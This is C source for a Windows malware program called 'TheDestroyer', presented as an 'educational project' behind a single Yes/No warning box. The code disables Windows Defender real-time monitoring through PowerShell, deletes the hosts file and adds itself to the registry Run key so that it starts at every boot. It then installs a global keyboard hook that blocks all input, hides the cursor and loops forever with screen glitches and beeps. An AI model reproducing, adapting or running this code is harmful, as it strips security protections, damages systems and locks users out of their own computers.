#include <windows.h>
#include <stdlib.h>
#include <stdio.h>

// Keyboard hook to disable all keys
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    return 1; // Block input
}

// System damage functions
void DestroySystem() {
    // Disable Windows Defender
    system("powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");
    // Delete the hosts file to disrupt network redirection
    remove("C:\\Windows\\System32\\drivers\\etc\\hosts");
}

// Persistence: ensures the program runs on every system startup
void SetPersistence() {
    char path[MAX_PATH];
    GetModuleFileName(NULL, path, MAX_PATH);
    HKEY hKey;
    if (RegOpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, "TheDestroyer", 0, REG_SZ, (unsigned char*)path, strlen(path));
        RegCloseKey(hKey);
    }
}

int main() {
    // Set the CMD console title
    SetConsoleTitle("TheDestroyer - SYSTEM COMPROMISED");

    // Safety Disclaimer
    int msgboxID = MessageBox(
        NULL,
        "WARNING!!!\n\n"
        "This is an educational project. Running this software on your physical computer is NOT recommended. "
        "Execute this only within a controlled environment like VirtualBox.\n\n"
        "I take no responsibility for any data loss or system damage caused by this software.\n\n"
        "Do you wish to proceed?",
        "WARNING!!!",
        MB_ICONWARNING | MB_YESNO | MB_DEFBUTTON2
    );

    // If user selects 'No', exit immediately
    if (msgboxID == IDNO) {
        return 0;
    }

    // Execute destruction and persistence
    DestroySystem();
    SetPersistence();
    
    printf("TheDestroyer is now active. System under control.\n");
    
    // Set global keyboard hook to prevent user input
    HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
    
    // Hide mouse cursor
    ShowCursor(FALSE);

    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);
    
    // Infinite loop for the "show"
    while(1) {
        HDC hdc = GetDC(NULL);
        
        // Random screen glitches
        PatBlt(hdc, rand() % w, rand() % h, rand() % 500, rand() % 500, DSTINVERT);
        
        // Audio noise
        Beep(150, 40); 
        
        ReleaseDC(NULL, hdc);
        
        // Keep the message loop alive to ensure the system remains responsive to the hook
        MSG msg;
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        Sleep(50);
    }
    return 0;
}